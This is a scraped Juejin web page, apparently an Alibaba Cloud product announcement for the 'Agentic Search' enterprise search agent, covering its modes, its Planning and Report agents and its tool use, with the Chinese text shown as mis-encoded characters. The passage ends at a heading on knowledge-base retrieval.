content="é˜¿é‡Œäº‘å¤§æ•°æ®AIæŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/2414974667341287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Agentic Search: AIé©±åŠ¨çš„ä¸‹ä¸€ä»£ä¼ä¸šæœç´¢
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2414974667341287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘å¤§æ•°æ®AIæŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T10:28:59.000Z" title="Thu Jan 15 2026 10:28:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63e50ef8bdea48cbbda2cf9b2a679231~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077739&amp;x-signature=DyLQbqIfJgNDM5cHs%2FDmb%2Be6qoo%3D" alt="" loading="lazy"/><br/>
<img alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" src="" loading="lazy"/></p>
<h2 data-id="heading-0">èƒŒæ™¯ä»‹ç»</h2>
<p>åœ¨ç”Ÿæˆå¼ AI æµªæ½®ä¸ LLM æ¨¡å‹èƒ½åŠ›é£é€Ÿæ¼”è¿›çš„æ¨åŠ¨ä¸‹ï¼Œä¸€åœºæ·±åˆ»çš„æŠ€æœ¯èŒƒå¼é©å‘½æ­£åœ¨é‡å¡‘æˆ‘ä»¬ä¸ä¿¡æ¯è·å–äº¤äº’æ–¹å¼ã€‚æœç´¢ï¼Œè¿™ä¸€ä¿¡æ¯æ™ºèƒ½åŒ–å·¥ä½œçš„åŸºçŸ³ï¼Œæ­£ç»å†ç€ä»â€œä¿¡æ¯æ£€ç´¢å·¥å…·â€åˆ°â€œAI æœç´¢è‡ªä¸»æ™ºèƒ½æ‰§è¡Œå…¥å£â€çš„æ ¹æœ¬æ€§èœ•å˜ã€‚</p>
<p>ä¼ ç»Ÿçš„æœç´¢æ¶æ„ï¼Œä»¥å…³é”®è¯åŒ¹é…å’Œé“¾æ¥åˆ—è¡¨ä¸ºæ ¸å¿ƒï¼Œå°†ä¿¡æ¯ç­›é€‰ã€æ•´åˆåˆ†æä¸æœ€ç»ˆå†³ç­–çš„è®¤çŸ¥è´Ÿè·å®Œå…¨äº¤ç»™äº†ç”¨æˆ·ã€‚ç„¶è€Œï¼Œåœ¨çœŸå®çš„ä¼ä¸šå·¥ä½œæµä¸ç”Ÿäº§åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬é¢ä¸´çš„æŒ‘æˆ˜è¿œæ¯”ç®€å•çš„ä¿¡æ¯æŸ¥è¯¢æ›´ä¸ºå¤æ‚å’Œå¼€æ”¾ã€‚æˆ‘ä»¬çš„ç›®æ ‡ä¸å†æ˜¯â€œæ‰¾åˆ°ä¸€ä»½æ–‡æ¡£â€ï¼Œè€Œæ˜¯è¦â€œå…¨è‡ªåŠ¨åŒ–å®Œæˆä¸€é¡¹ä»»åŠ¡â€ã€â€œå¾—å‡ºä¸€ä¸ªå¯è¡Œæ€§ç»“è®ºâ€æˆ–â€œç”Ÿæˆä¸€ä»½å¯äº¤ä»˜çš„æˆæœâ€ã€‚</p>
<p>ä¸ºæ­¤ï¼Œæˆ‘ä»¬å…¨æ–°å‡çº§æ¨å‡º OpenSearch äº§å“ç³»åˆ—-ä¸»åŠ¨æ™ºèƒ½æ´å¯Ÿ Agent äº§å“ Agentic Searchã€‚Agentic Search æ˜¯ä¸€ç§ä»¥è‡ªä¸»æ™ºèƒ½ä½“ï¼ˆAgentï¼‰ä¸ºæ ¸å¿ƒé©±åŠ¨ï¼Œä»¥ä¿¡æ¯æ£€ç´¢ä¸æ•´åˆä¸ºåšå®åŸºç¡€çš„é©å‘½æ€§æ¶æ„ã€‚å®ƒå°†æœç´¢ã€æ¨ç†ã€è§„åˆ’å’Œå·¥å…·è°ƒç”¨å››ç§èƒ½åŠ›æ·±åº¦èåˆï¼Œæ„å»ºäº†ä¸€ä¸ªå®Œæ•´çš„â€œç†è§£-è§„åˆ’-æ‰§è¡Œ-åé¦ˆâ€é—­ç¯ã€‚å®ƒåŒæ—¶æ•´åˆäº†æ­¤å‰çš„â€œOpenSearch LLM æ™ºèƒ½é—®ç­”ç‰ˆâ€å·²å…·å¤‡å¼ºå¤§çš„æ·±åº¦æ£€ç´¢ï¼ˆDeep Searchï¼‰ä¸ç ”ç©¶æ•´åˆï¼ˆDeep Researchï¼‰èƒ½åŠ›ã€‚</p>
<p>è¿™æ„å‘³ç€ï¼ŒAI æ—¶ä»£çš„æœç´¢ä¸å†æ˜¯è¢«åŠ¨åœ°å“åº”æŒ‡ä»¤ï¼Œè€Œæ˜¯è½¬å˜ä¸ºä¸€ä¸ªèƒ½å¤Ÿä¸»åŠ¨æ‰§è¡Œä»»åŠ¡çš„AIæ™ºèƒ½ä¼™ä¼´ã€‚å®ƒèƒ½å¤Ÿæ·±åˆ»ç†è§£å¤æ‚æ„å›¾ï¼Œè‡ªä¸»åœ°å°†å®å¤§ä»»åŠ¡æ‹†è§£ä¸ºä¸€ç³»åˆ—å¯æ‰§è¡Œæ­¥éª¤ï¼Œå¹¶æ™ºèƒ½è°ƒç”¨å¿…è¦çš„å†…éƒ¨ç³»ç»Ÿæˆ–å¤–éƒ¨å·¥å…·æ¥å®Œæˆæ¯ä¸€æ­¥ï¼Œæœ€ç»ˆå‘ˆç°ä¸€ä¸ªå®Œæ•´çš„ã€å¯ç›´æ¥ä½¿ç”¨çš„ç»“æœã€‚</p>
<p>é€šè¿‡ Agentic Search äº§å“ï¼Œæˆ‘ä»¬å¸Œæœ›å¼•é¢†ä¼ä¸šæœç´¢è·¨è¶Šä»â€œè¢«åŠ¨å“åº”â€åˆ°â€œä¸»åŠ¨æ‰§è¡Œâ€çš„é¸¿æ²Ÿï¼Œå…¨é“¾è·¯è¦†ç›–ä»ç®€å•é—®ç­”åˆ°æ·±åº¦æ‰§è¡Œçš„æ¯ä¸€ä¸ªç¯èŠ‚ï¼Œæœ€ç»ˆå°†ä¼ä¸šçŸ¥è¯†åº“ä»é™æ€çš„ä¿¡æ¯å­¤å²›ï¼Œå½»åº•æ¿€æ´»ä¸ºé©±åŠ¨ä¸šåŠ¡å¢é•¿çš„åŠ¨æ€æ½œèƒ½ã€‚</p>
<h3 data-id="heading-1">Demo å±•ç¤º</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.video.taobao.com%2Fvod%2F6fkBKrt23wasAF9bx2TURMRUML0ePPJHnAvX1zAOhrM.mp4" target="_blank" title="https://cloud.video.taobao.com/vod/6fkBKrt23wasAF9bx2TURMRUML0ePPJHnAvX1zAOhrM.mp4" ref="nofollow noopener noreferrer">cloud.video.taobao.com/vod/6fkBKrtâ€¦</a></p>
<h2 data-id="heading-2">æ ¸å¿ƒäº®ç‚¹</h2>
<h3 data-id="heading-3">Agenticé©±åŠ¨çš„å…¨æ–°æœç´¢èŒƒå¼ï¼šä»â€œè¢«åŠ¨å“åº”â€åˆ°â€œè‡ªä¸»æ‰§è¡Œâ€çš„é£è·ƒ</h3>
<p>Agentic Search çš„æ ¸å¿ƒå˜é©åœ¨äºå¼•å…¥äº†â€œæ™ºèƒ½ä½“ï¼ˆAgentï¼‰â€ä½œä¸ºåŸºæœ¬èƒ½åŠ›å•å…ƒã€‚è¿™ä¸å†æ˜¯ç®€å•çš„åŠŸèƒ½å åŠ ï¼Œè€Œæ˜¯ä¸€æ¬¡æ¶æ„å±‚é¢çš„èŒƒå¼è½¬ç§»ï¼Œèµ‹äºˆäº†æœç´¢å‰æ‰€æœªæœ‰çš„è‡ªä¸»æ€§ä¸èƒ½åŠ¨æ€§ã€‚å…¶å…·å¤‡å››å¤§æ ¸å¿ƒèƒ½åŠ›ï¼š</p>
<p><strong>æ·±åº¦æ„å›¾ç†è§£ä¸è‡ªä¸»ä»»åŠ¡æ‰§è¡Œ</strong></p>
<p>è¶…è¶Šå…³é”®è¯çš„è¡¨å±‚åŒ¹é…ï¼ŒAgentic Search èƒ½å¤Ÿæ·±åˆ»ç†è§£æ‚¨æå‡ºçš„æ¨¡ç³Šã€å¤æ‚ç”šè‡³å¼€æ”¾å¼çš„ä¸šåŠ¡ç›®æ ‡ï¼ˆä¾‹å¦‚ï¼Œâ€œåˆ†ææœ¬å­£åº¦ä¸»è¦ç«å“çš„å¸‚åœºç­–ç•¥å˜åŒ–â€ï¼‰ï¼Œå¹¶å°†å…¶ç²¾ç¡®åœ°æŠ½è±¡ä¸ºå¯æ‰§è¡Œçš„ä»»åŠ¡ã€‚</p>
<p><strong>å¤šæ­¥éª¤æ™ºèƒ½æ¨ç†ä¸åŠ¨æ€è§„åˆ’</strong></p>
<p>é¢å¯¹å¤æ‚ä»»åŠ¡ï¼ŒAgentic Search èƒ½å¤Ÿåƒäººç±»ä¸“å®¶ä¸€æ ·è¿›è¡Œé€»è¾‘æ¨ç†ï¼Œè‡ªä¸»åœ°å°†å®è§‚ç›®æ ‡æ‹†è§£ä¸ºä¸€ç³»åˆ—å…·ä½“çš„ã€æœ‰åºçš„è¡ŒåŠ¨æ­¥éª¤ã€‚è¿™ä¸€è§„åˆ’è¿‡ç¨‹æ˜¯åŠ¨æ€çš„ï¼Œå¯æ ¹æ®ä¸­é—´æ­¥éª¤çš„ç»“æœå®æ—¶è°ƒæ•´åç»­ç­–ç•¥ï¼Œç¡®ä¿ä»»åŠ¡è·¯å¾„çš„æœ€ä¼˜åŒ–ã€‚</p>
<p><strong>å¤šå·¥å…·ååŒä¸ç”Ÿæ€è°ƒç”¨</strong></p>
<p>Agentic Search æ˜¯ä¼ä¸šæ•°å­—åŒ–ç”Ÿæ€çš„â€œè¶…çº§è¿æ¥å™¨â€ã€‚å®ƒèƒ½æ™ºèƒ½åˆ¤æ–­å¦‚ï¼šä½•æ—¶éœ€è¦æŸ¥è¯¢ä¸“ä¸šæ•°æ®åº“ï¼Œæˆ–ä½•æ—¶éœ€è¦è”ç½‘è·å–æœ€æ–°èµ„è®¯ç­‰ï¼Œå¹¶ååŒè¿™äº›æ™ºèƒ½å·¥å…·è‡ªä¸»æ— ç¼è°ƒç”¨ä¼ä¸šå·¥ä½œï¼Œä»¥å®Œæˆä»…é è‡ªèº«æ¨¡å‹æ— æ³•å®Œæˆçš„ä»»åŠ¡ã€‚</p>
<p><strong>å¤šæ¨¡æ€æ„ŸçŸ¥ä¸ç†è§£èƒ½åŠ›</strong></p>
<p>å¤šæ¨¡æ€å¤„ç†èƒ½åŠ›å¯åˆ†æä¸ç†è§£éç»“æ„åŒ–çš„ç°å®ä¸–ç•Œæ•°æ®ã€‚è§†è§‰ç†è§£èƒ½å¤Ÿè¯†åˆ«å›¾åƒæˆ–è§†é¢‘ä¸­çš„ç‰©ä½“ã€ç†è§£ç©ºé—´å…³ç³»ã€è¯»å– OCR æ–‡æœ¬ï¼Œç”šè‡³åˆ†æè§†é¢‘ä¸­çš„åŠ¨æ€äº‹ä»¶ã€‚æ–‡æ¡£å¤šæ¨¡æ€è§£æèƒ½åŠ›åŒæ—¶å¤„ç† PDF ä¸­çš„æ–‡å­—ã€å¤æ‚è¡¨æ ¼å’Œç»Ÿè®¡å›¾è¡¨ï¼Œå®ç°â€œæ‰€è§å³æ‰€æŸ¥â€ã€‚</p>
<p><strong>ç»“æœä¿¡æ¯æ™ºèƒ½æ•´åˆä¸å¤šå…ƒåŒ–å‘ˆç°</strong></p>
<p>Agentic Search æœ€ç»ˆäº¤ä»˜çš„ä¸å†æ˜¯é›¶æ•£çš„ä¿¡æ¯ç¢ç‰‡ã€‚å…¶ä¼šå°†æ‰€æœ‰æ‰§è¡Œæ­¥éª¤çš„ç»“æœè¿›è¡Œæ·±åº¦æ•´åˆã€å»ä¼ªå­˜çœŸï¼Œå¹¶ä»¥éœ€è¦çš„æ ¼å¼è¿›è¡Œè¾“å‡ºâ€”â€”å¯èƒ½æ˜¯ä¸€ä»½ç»“æ„åŒ–çš„åˆ†ææŠ¥å‘Šã€ä¸€ä¸ªå¯è§†åŒ–çš„æ•°æ®å›¾è¡¨ï¼Œæˆ–æ˜¯ä¸€æ®µä»£ç ç­‰ã€‚</p>
<h3 data-id="heading-4">ä¸‰ç§æ¨¡å¼ï¼Œè¦†ç›–ä»é—®ç­”åˆ°å¤æ‚ä»»åŠ¡æ‰§è¡Œçš„å…¨é“¾è·¯éœ€æ±‚</h3>
<p>Agentic Search æä¾›äº†ä¸€ä¸ªçµæ´»ä¸”å¼ºå¤§çš„å¤šæ¨¡å¼æ¡†æ¶ï¼Œæ— ç¼è¦†ç›–ä»å¿«é€Ÿä¿¡æ¯è·å–åˆ°æ·±åº¦æˆ˜ç•¥åˆ†æçš„åº”ç”¨åœºæ™¯ï¼Œç¡®ä¿åœ¨ä»»ä½•æƒ…å¢ƒä¸‹éƒ½èƒ½æä¾›æœ€ä¼˜çš„äº¤äº’ä½“éªŒä¸æ‰§è¡Œæ•ˆç‡ã€‚</p>
<p><strong>å¯¹è¯æ¨¡å¼</strong></p>
<p>ä¸ºå³æ—¶æ€§ã€é«˜é¢‘æ¬¡çš„é—®ç­”åœºæ™¯è€Œç”Ÿã€‚å½“æ‚¨éœ€è¦å¿«é€Ÿè·å–ä¸€ä¸ªç²¾å‡†ç­”æ¡ˆæ—¶ï¼Œè¯¥æ¨¡å¼å°†ä»¥ç§’çº§å“åº”é€Ÿåº¦ï¼Œèåˆå†…éƒ¨çŸ¥è¯†åº“ä¸å…¨ç½‘å…¬å¼€ä¿¡æ¯ï¼Œæä¾›æœ€ç›´æ¥ã€æœ€å‡†ç¡®çš„è§£ç­”ã€‚</p>
<p><strong>è§„åˆ’æ¨¡å¼</strong></p>
<p>ä¸“ä¸ºå¤„ç†å¤æ‚ã€å¤šç»´åº¦çš„æˆ˜ç•¥æ€§ä»»åŠ¡è€Œè®¾è®¡ã€‚å½“æ‚¨çš„ç›®æ ‡éœ€è¦å¤šæ­¥æ¨ç†ã€è·¨ç³»ç»Ÿæ•°æ®æ•´åˆä¸æ·±åº¦åˆ†ææ—¶ï¼Œè¯¥æ¨¡å¼å°†å¯åŠ¨å®Œæ•´çš„â€œç†è§£-è§„åˆ’-æ‰§è¡Œ-æ•´åˆâ€å·¥ä½œæµï¼Œè‡ªä¸»å®Œæˆä»æ•°æ®é‡‡é›†åˆ°æ´å¯Ÿå‘ˆç°çš„å…¨è¿‡ç¨‹ã€‚</p>
<p><strong>è‡ªé€‚åº”æ¨¡å¼</strong></p>
<p>è¿™æ˜¯ Agentic Search çš„æ™ºæ…§æ ¸å¿ƒã€‚ç³»ç»Ÿå°†åŸºäºå¯¹ç”¨æˆ·æ„å›¾å¤æ‚åº¦çš„å®æ—¶è¯„ä¼°ï¼Œæ™ºèƒ½åˆ¤æ–­å¹¶è‡ªåŠ¨é€‰æ‹©æœ€ä¼˜çš„å·¥ä½œæ¨¡å¼ã€‚ç”¨æˆ·æ— éœ€å…³å¿ƒèƒŒåæ˜¯â€œå¯¹è¯â€è¿˜æ˜¯â€œè§„åˆ’â€ï¼Œåªéœ€æå‡ºé—®é¢˜ï¼Œç³»ç»Ÿä¾¿ä¼šä»¥æœ€é«˜æ•ˆçš„æ–¹å¼äº¤ä»˜æœ€ä½³ç»“æœï¼Œå®ç°çœŸæ­£çš„æ— æ„Ÿæ™ºèƒ½ä½“éªŒã€‚</p>
<h2 data-id="heading-5">äº§å“æ¶æ„</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45f79d85fa574892b27d45cb63dd1db7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077739&amp;x-signature=cwE%2FvAfpnFcnex5V52ie0xB0Bag%3D" alt="" loading="lazy"/></p>
<p>è¯¥æ¶æ„é€šè¿‡æ™ºèƒ½è·¯ç”±ã€åŒæ¨¡é©±åŠ¨ã€Agent è§„åˆ’ä¸å¤šå·¥å…·ååŒï¼Œæ„å»ºäº†ä¸€ä¸ªä»ç†è§£æ„å›¾åˆ°äº¤ä»˜æˆæœçš„å…¨é“¾è·¯è‡ªåŠ¨åŒ–ç³»ç»Ÿã€‚</p>
<p><strong>æ™ºèƒ½å‰ç«¯ä¸å†³ç­–ä¸­æ¢</strong></p>
<p>é—®é¢˜è·¯ç”±: è¯¥æ¨¡å—ä¼šå¯¹ç”¨æˆ·æ„å›¾çš„å¤æ‚åº¦è¿›è¡Œå®æ—¶è¯„ä¼°ï¼Œæ™ºèƒ½åˆ¤æ–­åº”é‡‡ç”¨æœ€é«˜æ•ˆçš„å¤„ç†è·¯å¾„ï¼šæ˜¯éœ€è¦å¿«é€Ÿå“åº”çš„ç›´æ¥é—®ç­”ï¼Œè¿˜æ˜¯éœ€è¦æ·±åº¦åˆ†æçš„å¤æ‚ä»»åŠ¡ã€‚</p>
<p><strong>åŒæ¨¡å¼å¤„ç†è·¯å¾„</strong></p>
<p>å¯¹è¯æ¨¡å¼: å¯¹äºæ¸…æ™°ã€ç›´æ¥çš„é—®é¢˜ï¼Œç³»ç»Ÿå°†æ¿€æ´»æ­¤æ¨¡å¼ã€‚å®ƒé€šè¿‡æ„å›¾è¯†åˆ«å¿«é€Ÿé”å®šç”¨æˆ·ç›®æ ‡ï¼Œå¹¶è°ƒç”¨éƒ¨åˆ†è½»é‡çº§å·¥å…·ï¼ˆå¦‚çŸ¥è¯†åº“æŸ¥è¯¢ã€è”ç½‘æœç´¢ï¼‰ä»¥æä¾›å³æ—¶ã€ç²¾å‡†çš„ç­”æ¡ˆã€‚</p>
<p>è§„åˆ’æ¨¡å¼: å½“é¢å¯¹å¼€æ”¾å¼ã€å¤šæ­¥éª¤çš„å¤æ‚ç›®æ ‡æ—¶ï¼Œç³»ç»Ÿè¿›å…¥æ­¤æ¨¡å¼ã€‚ç”¨æˆ·çš„å®è§‚æŒ‡ä»¤è¢«ä¼ é€’ç»™æ ¸å¿ƒçš„ Planning Agentã€‚</p>
<p><strong>æ ¸å¿ƒè§„åˆ’ä¸æ‰§è¡Œå•å…ƒ</strong></p>
<p>Planning Agent: è¿™æ˜¯æ•´ä¸ªç³»ç»Ÿçš„â€œæ€»æŒ‡æŒ¥â€ã€‚å®ƒè´Ÿè´£å¯¹å¤æ‚ä»»åŠ¡è¿›è¡Œåˆ†æã€æ‹†è§£ä¸åˆ†é…ï¼Œå°†å…¶è½¬åŒ–ä¸ºä¸€ä¸ªç”±å¤šä¸ªå­ä»»åŠ¡ç»„æˆçš„ã€é€»è¾‘æ¸…æ™°çš„æ‰§è¡Œè®¡åˆ’ã€‚</p>
<p>å¼ºå¤§çš„å·¥å…·é›†: Planning Agent é€šè¿‡å·¥å…·è°ƒç”¨æœºåˆ¶ï¼ŒæŒ‡æŒ¥ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·é›†æ¥æ‰§è¡Œå…·ä½“çš„å­ä»»åŠ¡ã€‚</p>
<p>é—­ç¯åé¦ˆ: æ¯ä¸ªå·¥å…·æ‰§è¡Œçš„ç»“æœéƒ½ä¼šè¿”å›ç»™ Planning Agentï¼Œåè€…æ ¹æ®åé¦ˆåŠ¨æ€è°ƒæ•´åç»­çš„è®¡åˆ’ï¼Œå±•ç°å‡ºçœŸæ­£çš„æ™ºèƒ½å’Œé€‚åº”æ€§ã€‚</p>
<p><strong>æˆæœæ•´åˆä¸è¾“å‡º</strong></p>
<p>Report Agent: Planning Agent å°†ä»»åŠ¡çš„æ‰§è¡Œç»“æœå’Œæ ¸å¿ƒæ´å¯Ÿï¼Œç§»äº¤ç»™â€œæŠ¥å‘Šæ™ºèƒ½ä½“â€ã€‚è¿™ä¸ªè§’è‰²è´Ÿè´£å°†ä¿¡æ¯è¿›è¡Œæ•´åˆã€æç‚¼ä¸ç¾åŒ–ã€‚æœ€ç»ˆï¼Œç³»ç»Ÿä»¥ç»“æ„åŒ–çš„ã€å¤šå…ƒåŒ–çš„æ ¼å¼ï¼ˆå¦‚Markdownæˆ–HTMLæŠ¥å‘Šï¼‰å‘ç”¨æˆ·äº¤ä»˜ä¸€ä¸ªå®Œæ•´çš„ã€å¯ç›´æ¥ä½¿ç”¨çš„æˆæœã€‚</p>
<h2 data-id="heading-6">åŠŸèƒ½ä»‹ç»</h2>
<h3 data-id="heading-7">å¤§æ¨¡å‹é©±åŠ¨çš„æ™ºèƒ½æ ¸å¿ƒï¼šç²¾å‡†æ„å›¾ç†è§£ä¸è‡ªä¸»ä»»åŠ¡è§„åˆ’</h3>
<p>Agentic Search çš„æ™ºæ…§å¤§è„‘ï¼Œç”±å¼€æºé¢†åŸŸå…¨çƒç¬¬ä¸€çš„é€šä¹‰åƒé—®æ¨¡å‹å®¶æ—é©±åŠ¨ã€‚è¿™ä¸€å¼ºå¤§çš„æ¨¡å‹å†…æ ¸ï¼Œä¸ºäº§å“æ³¨å…¥äº†å¼ºå¤§çš„è®¤çŸ¥èƒ½åŠ›ï¼Œç¡®ä¿åœ¨æ¯ä¸€ä¸ªäº¤äº’ç¯èŠ‚éƒ½èƒ½ç²¾å‡†æ´æ‚‰ç”¨æˆ·æ„å›¾ã€‚åœ¨æ™ºèƒ½é—®é¢˜è·¯ç”±ã€å¤æ‚ä»»åŠ¡æ‹†è§£ã€æ·±å±‚æ„å›¾è¯†åˆ«ç­‰æ ¸å¿ƒç¯èŠ‚è¿›è¡Œæ·±åº¦ä¼˜åŒ–ï¼Œç¡®ä¿ Agentic Search çœŸæ­£â€œå¬æ‡‚â€æ‚¨çš„æ¯ä¸€ä¸ªæŒ‡ä»¤ï¼Œå¹¶ä»¥æ­¤ä¸ºèµ·ç‚¹ï¼Œç²¾å‡†åœ°å®Œæˆæ‚¨çš„ç›®æ ‡ã€‚</p>
<p><strong>ä¸°å¯ŒSubAgentå·¥å…·é›†</strong></p>
<p>Agentic Search çš„å¼ºå¤§æ‰§è¡ŒåŠ›ï¼Œæºäºå…¶å†…ç½®çš„ä¸€ä¸ªå…¨é¢ä¸”é«˜åº¦ååŒçš„å·¥å…·é›†ã€‚è¿™äº›å·¥å…·ä½¿å…¶èƒ½å¤Ÿçªç ´è¯­è¨€æ¨¡å‹çš„é™åˆ¶ï¼Œä¸æ•°å­—ä¸–ç•Œè¿›è¡Œæ·±åº¦äº¤äº’ï¼Œå®Œæˆå„ç±»å¤æ‚ä»»åŠ¡ã€‚</p>
<p><strong>å¤šæ¨¡æ€æ™ºèƒ½ä½“</strong></p>
<p>Agentic Search èƒ½å¤Ÿæ·±åº¦è§£æåŒ…æ‹¬ PDFã€Wordã€PPTã€å›¾ç‰‡ç­‰åœ¨å†…çš„å¤šç§éç»“æ„åŒ–ä¸åŠç»“æ„åŒ–æ–‡æ¡£ã€‚å®ƒä¸ä»…ä»…æ˜¯è¯»å–æ–‡æœ¬ï¼Œæ›´èƒ½ç†è§£å…¶ä¸­çš„è¡¨æ ¼ã€å›¾è¡¨å’Œå¸ƒå±€ï¼Œå°†é™æ€æ–‡æ¡£è½¬åŒ–ä¸ºå¯ä¾›åˆ†æçš„åŠ¨æ€æ•°æ®ã€‚</p>
<p><strong>ä¼ä¸šçŸ¥è¯†åº“æ£€ç´¢</strong></p>
